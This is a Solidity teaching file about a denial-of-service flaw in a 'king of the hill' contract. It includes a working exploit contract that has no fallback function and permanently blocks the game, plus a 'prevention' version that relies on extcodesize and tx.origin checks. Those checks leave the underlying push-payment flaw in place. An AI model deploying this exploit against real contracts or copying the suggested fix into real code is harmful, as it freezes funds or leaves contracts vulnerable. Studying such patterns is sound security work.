// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract KingOfEth {
    address payable public king;

    function play() external payable {
        // previous balance = current balance - ETH sent
        uint bal = address(this).balance - msg.value;
        require(msg.value > bal, "need to pay more to become the king");
        
        // Contract will always fail as no fallback on the exploite contract
        (bool sent, ) = king.call{value: bal}("");
        require(sent, "failed to send ETH");

        king = payable(msg.sender);
    }
}

// Exploite
interface IKingOfEth {
    function play() external payable;
}

contract KingOfEthExploit {
    IKingOfEth public target;

    constructor(IKingOfEth _target) {
        target = _target;
    }

    // no fallback to accept ETH
    
    function pwn() external payable {
        target.play{value: msg.value}();
    }
}



// -----> Prevention - to check if the sender is a contract address even if the 
// exploite try to attack during construction phase
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract KingOfEth {
    address payable public king;

    function isContract(address addr) public view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

    function play() external payable {
        // previous balance = current balance - ETH sent
        uint bal = address(this).balance - msg.value;
        require(msg.value > bal, "need to pay more to become the king");
        require(!isContract(msg.sender), "contact address found");
        require(tx.origin == msg.sender, "failed in tx.origin check");
        
        (bool sent, ) = king.call{value: bal}("");
        require(sent, "failed to send ETH");

        king = payable(msg.sender);
    }
}

interface IKingOfEth {
    function play() external payable;
}

// Failed Exploit
contract FailedKingOfEthExploit {
    constructor(IKingOfEth _target) payable {
        _target.play{value: msg.value}();
    }
}


